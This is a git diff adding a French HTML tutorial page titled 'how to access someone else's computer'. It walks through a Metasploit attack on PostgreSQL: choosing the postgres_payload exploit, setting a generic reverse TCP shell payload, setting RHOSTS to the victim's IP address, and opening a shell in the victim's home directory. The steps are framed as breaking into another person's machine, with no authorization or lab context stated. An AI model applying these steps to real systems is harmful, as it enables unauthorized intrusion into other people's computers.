@@ -1,0 +1,44 @@
+<h1><b>Comment avoir accès à l'ordinateur d'un autre ?</b></h1>
+
+
+<h2><U>Voici un tutoriel afin d'avoir accès au PC d'un autre en exploitant la faille PostgreSQL</U></h2>
+
+<p>Dans ce tutoriel, nous allons exploiter une faille sur le service PostgreSQL, pour cela nous allons utiliser
+    metasploitable-framework.<br><br>
+
+    Dans un premier temps, nous allons chercher PostgreSQL dans la console msfconsole</p>
+
+<img src="images/post1.jpg" alt="" class="img-fluid">
+
+<p>Ensuite, nous allons utiliser la commande use exploit/linux/postgres/postgres_payload :</p>
+
+<img src="images/post2.jpg" alt="" class="img-fluid">
+
+Puis, nous allons utiliser la commande show options pour voir les options possibles pour cette faille :
+
+<img src="images/post3.jpg" alt="" class="img-fluid">
+
+Ensuite, nous allons utiliser la commande show payloads pour voir les options possibles pour cette faille :
+
+<img src="images/post4.jpg" alt="" class="img-fluid">
+
+<p>Nous allons utiliser la commande set payload payload/generic/shell_reverse_tcp sur voir les options possibles
+    pour cette faille : </p>
+
+<img src="images/post5.jpg" alt="" class="img-fluid">
+
+<p>Nous allons utiliser la commande set RHOSTS IP_de_la_victime qui va mettre dans rhosts l’adresse ip de la victime
+    :</p>
+
+<img src="images/post6.jpg" alt="" class="img-fluid">
+
+<p>Nous allons utiliser la commande shell :</p>
+
+<img src="images/post7.jpg" alt="" class="img-fluid">
+
+<p>Puis nous retournons à la racine du répertoire :</p>
+
+<img src="images/post8.jpg" alt="" class="img-fluid">
+<img src="images/post9.jpg" alt="" class="img-fluid">
+
+<p>Maintenant, nous pouvons voir que nous sommes entrés dans la machine de la victime dans le répertoire home. </p>
